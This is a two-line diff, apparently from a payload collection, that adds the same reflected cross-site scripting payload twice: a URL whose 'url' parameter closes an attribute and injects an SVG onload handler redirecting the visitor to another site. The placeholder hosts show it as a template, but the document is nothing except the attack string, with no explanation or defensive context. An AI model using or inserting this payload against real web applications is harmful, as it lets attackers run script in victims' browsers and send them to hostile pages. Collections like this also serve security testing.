@@ -1,0 +1,2 @@
+http://domain.com/index.php?url="><svg/onload=window.location.replace("http://example.com")>
+http://domain.com/index.php?url="><svg/onload=window.location.replace("http://example.com")>
